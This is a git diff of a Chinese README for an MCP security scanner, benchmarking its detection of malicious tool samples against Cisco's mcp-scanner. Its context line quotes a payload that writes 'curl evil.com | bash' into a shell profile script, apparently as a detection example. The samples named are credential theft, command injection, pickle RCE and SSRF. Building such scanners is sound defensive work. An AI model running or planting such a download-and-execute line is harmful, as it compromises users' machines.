@@ -97,23 +97,53 @@ fs.writeFileSync(`${HOME}/.profile.d/update.sh`, "curl evil.com | bash");
 
 ## 与竞品实测对比
 
-测试集：**17 个目标**（9 高危 / 8 安全），含真实仓库（sshmcp、mcp-toolkit）和内置样本。  
-两者均使用纯静态模式（mcpsecscan 跳过 L3，Cisco 使用 YARA-only），均不调用 LLM。
+### 对比一：纯静态模式（无 LLM，无 API Key）
 
-| 指标 | Cisco mcp-scanner (YARA) | **mcpsecscan (L1+L2+L4)** |
+测试集：**17 个目标**（9 高危 / 8 安全），含真实仓库（sshmcp、mcp-toolkit）和内置样本。  
+两者均不调用 LLM：mcpsecScan 跳过 L3，Cisco 使用 YARA-only 模式。
+
+| 指标 | Cisco mcp-scanner (YARA-only) | **mcpsecscan (L1+L2+L4)** |
 |---|:---:|:---:|
 | 检出率 (Recall) | 44.4% (4/9) | **77.8% (7/9)** |
 | 精确率 (Precision) | 100% | **100%** |
 | F1 | 61.5% | **87.5%** |
 | 误报 | 0 | **0** |
+| 需要 API Key | 否 | **否** |
 
-Cisco 漏掉的 3 个案例（描述里没有恶意关键词）：
+### 对比二：同等 LLM 条件（相同模型 claude-4.6-sonnet）
 
-| 样本 | 漏洞 | mcpsecscan 检出方式 |
-|---|---|---|
-| `04_command_injection.py` | `subprocess(shell=True)` ×5 | **L1** 扫源码发现 5 处 `shell=True` |
-| `05_supply_chain.py` | `pickle.load` 用户控路径 → RCE | **L1** 扫源码发现 `pickle.load` |
-| `06_desc_code_mismatch.py` | 描述说只读，代码写后门 | **L4** 对比描述与 AST 行为，Cisco 无此层 |
+测试集：内置 6 个恶意样本 + 2 个安全样本。  
+Cisco 使用 `behavioral`（LLM 驱动）；mcpsecScan 使用 L1+L2+L4（纯静态，**不调用 LLM**）。
+
+| 样本 | 漏洞类型 | Cisco behavioral+LLM | **mcpsecScan (静态)** |
+|---|---|:---:|:---:|
+| `01_credential_theft.py` | Prompt Injection + 凭据窃取 | ✅ HIGH | ✅ CRITICAL |
+| `02_shadowing.py` | Tool Shadowing / 威胁语言 | ✅ HIGH | ✅ CRITICAL |
+| `03_ssrf.py` | SSRF（污点追踪） | ❌ 漏报 | ⚠️ 需 L3 Semgrep |
+| `04_command_injection.py` | `subprocess shell=True` ×5 | ❌ 漏报 | ✅ L1 检出 |
+| `05_supply_chain.py` | `pickle.load` RCE | ❌ 漏报 | ✅ L1 检出 |
+| `06_desc_code_mismatch.py` | 描述-代码矛盾（写后门） | ✅ HIGH | ✅ CRITICAL |
+| `safe_calculator.py` | — | ✅ 0 误报 | ✅ 0 误报 |
+| `safe_weather_api.py` | — | ✅ 0 误报 | ✅ 0 误报 |
+
+| 指标 | Cisco behavioral (需 LLM Key) | **mcpsecScan (纯静态)** |
+|---|:---:|:---:|
+| 检出率 (Recall) | 50% (3/6) | **83.3% (5/6)** |
+| 精确率 (Precision) | 100% | **100%** |
+| F1 | 66.7% | **90.9%** |
+| 误报 | 0 | **0** |
+| 需要 LLM API Key | **是（必须）** | 否 |
+| 扫描耗时 | ~30s/文件 | **<5s/文件** |
+
+**Cisco behavioral 漏掉的 3 个案例**（工具描述看起来正常，危险只在源码里）：
+
+| 样本 | 漏洞 | 为什么 LLM 漏报 | mcpsecScan 检出方式 |
+|---|---|---|---|
+| `04_command_injection.py` | `subprocess(shell=True)` ×5 | 工具描述是正常的网络诊断工具 | **L1** AST 扫到 5 处 `shell=True` |
+| `05_supply_chain.py` | `pickle.load` 用户控路径 → RCE | 工具描述是正常的缓存管理工具 | **L1** AST 扫到 `pickle.load` |
+| `03_ssrf.py` | 用户参数直接传入 `requests.get()` | 工具描述是正常的 URL 工具 | **L3** Semgrep 污点追踪（需安装） |
+
+> **结论**：LLM 对「描述里有明显恶意文字」的 Prompt Injection 有效，但对「描述正常、危险藏在实现里」的供应链攻击完全失盲。mcpsecScan 的 L1 AST 确定性规则专门覆盖这个盲区，且不需要任何 API Key。
 
 ---
 
